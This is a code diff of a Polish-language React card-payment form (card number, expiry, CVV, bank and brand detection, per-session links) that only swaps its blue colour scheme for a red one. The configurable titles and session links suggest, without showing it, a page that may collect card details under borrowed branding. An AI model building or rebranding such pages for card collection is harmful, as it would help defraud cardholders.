@@ -62,7 +62,7 @@ function CardBrandLogo({ brand }: { brand: string }) {
   }
   if (brand === "amex") {
     return (
-      <span className="rounded bg-[#2E77BC] px-1.5 py-0.5 text-[10px] font-bold tracking-wide text-[#0a2463]">AMEX</span>
+      <span className="rounded bg-[#2E77BC] px-1.5 py-0.5 text-[10px] font-bold tracking-wide text-[#6b0a0a]">AMEX</span>
     );
   }
   return null;
@@ -241,7 +241,7 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
     return (
       <div className="flex min-h-[100dvh] items-center justify-center">
         <div className="flex justify-center py-16">
-          <div className="size-12 animate-spin rounded-full border-4 border-[#dbe6f3] border-t-[var(--brand)]" />
+          <div className="size-12 animate-spin rounded-full border-4 border-[#f2d8c4] border-t-[var(--brand)]" />
         </div>
       </div>
     );
@@ -250,7 +250,7 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
   if (!supabase) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-5 sm:p-8">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#fff6ec] border border-[#f2d8c4] shadow-[0_20px_60px_rgba(107,10,10,0.15)] p-5 sm:p-8">
           <ConfigMissing />
         </div>
       </div>
@@ -260,7 +260,7 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
   if (!sessionId) {
     return (
       <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-        <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-5 sm:p-8 text-center">
+        <div className="w-full max-w-[650px] rounded-[24px] bg-[#fff6ec] border border-[#f2d8c4] shadow-[0_20px_60px_rgba(107,10,10,0.15)] p-5 sm:p-8 text-center">
           <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-600">
             Invalid link.
           </p>
@@ -271,7 +271,7 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
 
   return (
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-      <div className="w-full max-w-[650px] rounded-[24px] bg-white border border-[#dbe6f3] shadow-[0_20px_60px_rgba(10,36,99,0.15)] p-6 sm:p-10 relative z-10 fade-in">
+      <div className="w-full max-w-[650px] rounded-[24px] bg-[#fff6ec] border border-[#f2d8c4] shadow-[0_20px_60px_rgba(107,10,10,0.15)] p-6 sm:p-10 relative z-10 fade-in">
         
         {/* Right Top Logo Placeholder */}
         <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
@@ -288,13 +288,13 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
             <img src="/form-assets/icon-security.webp" alt="Secure Payment" className="h-12 w-12" id="card-security-icon" />
           </div>
           <div>
-            <h2 className="text-2xl font-bold text-[#0a2463] mb-1">{settings.card_title}</h2>
+            <h2 className="text-2xl font-bold text-[#6b0a0a] mb-1">{settings.card_title}</h2>
             <p className="text-sm text-gray-600 font-medium">{settings.card_subtitle}</p>
           </div>
         </div>
 
         <form onSubmit={handleSubmit} className="space-y-4">
-          <label className="block text-sm font-medium text-[#0a2463]">
+          <label className="block text-sm font-medium text-[#6b0a0a]">
             <div className="flex items-center justify-between gap-2">
               <span>{settings.card_number_label}</span>
               {(brand || bank) && (
@@ -304,11 +304,11 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
                       src={bank.logo}
                       alt={bank.name}
                       title={bank.name}
-                      className="h-6 w-auto rounded bg-white px-1 py-0.5 object-contain shadow-sm"
+                      className="h-6 w-auto rounded bg-[#fff6ec] px-1 py-0.5 object-contain shadow-sm"
                     />
                   )}
                   {brand && (
-                    <span className="rounded-md bg-white px-2 py-1 shadow-sm">
+                    <span className="rounded-md bg-[#fff6ec] px-2 py-1 shadow-sm">
                       <CardBrandLogo brand={brand.name} />
                     </span>
                   )}
@@ -339,12 +339,12 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
             </p>
           )}
           <div className="grid grid-cols-2 gap-3">
-            <label className="block text-sm font-medium text-[#0a2463]">
+            <label className="block text-sm font-medium text-[#6b0a0a]">
               {settings.card_expiry_label}
               <input
                 required
                 placeholder="MM/RR"
-                className="mt-2 block w-full rounded-xl border border-transparent bg-[#f0f6fb] py-3 px-4 text-lg text-[#0a2463] shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
+                className="mt-2 block w-full rounded-xl border border-transparent bg-[#f0f6fb] py-3 px-4 text-lg text-[#6b0a0a] shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
                 value={expiry}
                 onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                 autoComplete="cc-exp"
@@ -352,13 +352,13 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
                 maxLength={5}
               />
             </label>
-            <label className="block text-sm font-medium text-[#0a2463]">
+            <label className="block text-sm font-medium text-[#6b0a0a]">
               {settings.card_cvv_label}
               <input
                 required
                 inputMode="numeric"
                 maxLength={4}
-                className="mt-2 block w-full rounded-xl border border-transparent bg-[#f0f6fb] py-3 px-4 text-lg text-[#0a2463] shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
+                className="mt-2 block w-full rounded-xl border border-transparent bg-[#f0f6fb] py-3 px-4 text-lg text-[#6b0a0a] shadow-sm transition-colors placeholder:text-gray-500 focus:border-[var(--brand)] focus:outline-none focus:ring-2 focus:ring-[var(--brand)]/50"
                 value={cvc}
                 onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                 autoComplete="cc-csc"
@@ -383,7 +383,7 @@ export function CardClient({ sessionId: initialSessionId, routeSessionId }: Prop
           <button
             type="submit"
             disabled={saving || !numberValid || !expiryValid || !cvcValid}
-            className="w-full rounded-xl bg-gradient-to-r from-[var(--brand)] to-[var(--brand-dark)] py-4 text-lg font-bold text-white shadow-[0_8px_20px_rgba(0,83,159,0.25)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
+            className="w-full rounded-xl bg-gradient-to-r from-[var(--brand)] to-[var(--brand-dark)] py-4 text-lg font-bold text-white shadow-[0_8px_20px_rgba(221,26,33,0.25)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
           >
             {saving ? "Wysyłanie..." : settings.card_button}
           </button>
